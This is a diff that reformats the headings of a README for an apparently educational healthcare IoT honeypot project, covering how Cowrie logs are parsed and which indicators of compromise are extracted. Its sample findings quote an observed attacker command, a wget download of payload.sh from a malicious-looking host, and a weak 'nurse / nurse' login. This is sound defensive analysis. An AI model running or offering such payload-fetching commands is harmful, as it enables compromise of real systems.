@@ -55,7 +55,9 @@ After successfully deploying and exposing the healthcare IoT honeypot in Weeks 1
         | malware_hashes.csv               |
         | executed_commands.csv            |
         +----------------------------------+
-📁 Week 3 Important Files
+---
+
+# 📁 Week 3 Important Files
 logging/parsers/cowrie_parser.py
 
 data/processed/
@@ -67,20 +69,29 @@ data/processed/
 
 analysis/reports/
 └── Week3_Threat_Intelligence_Report.md
-🛠️ Core Technologies Used
+
+---
+
+# 🛠️ Core Technologies Used
 Python
 JSON Parsing
 CSV Export
 Cowrie Honeypot Logs
 Regex / IoC Detection
-🚀 Commands Used
+
+---
+
+# 🚀 Commands Used
 Run Cowrie Parser:
 python3 logging/parsers/cowrie_parser.py
 View Parsed JSON:
 cat data/processed/parsed_cowrie_logs.json
 View CSV Summary:
 cat data/processed/attack_summary.csv
-🔍 Key Indicators of Compromise (IoCs) Extracted
+
+---
+
+# 🔍 Key Indicators of Compromise (IoCs) Extracted
 Examples:
 Attacker IP addresses
 Failed credential attempts
@@ -88,21 +99,30 @@ Successful weak credential logins
 wget malware download attempts
 curl payload execution
 Command injection patterns
-📊 Sample Findings
+
+---
+
+# 📊 Sample Findings
 Brute Force:
 192.168.100.1 → 6 failed login attempts
 Command Injection:
 wget http://malicious-site.com/payload.sh
 Credential Theft:
 nurse / nurse
-📸 Week 3 Screenshot Checklist
+
+---
+
+# 📸 Week 3 Screenshot Checklist
 Required:
 W3_01_Cowrie_JSON_Parsing.png
 W3_02_Attack_Summary_CSV.png
 W3_03_IOC_Extraction_Report.png
 W3_04_Malware_Hash_Output.png
 W3_05_Executed_Commands_Report.png
-📄 Deliverables
+
+---
+
+# 📄 Deliverables
 Successfully Produced:
 
 ✔ Parsed honeypot logs
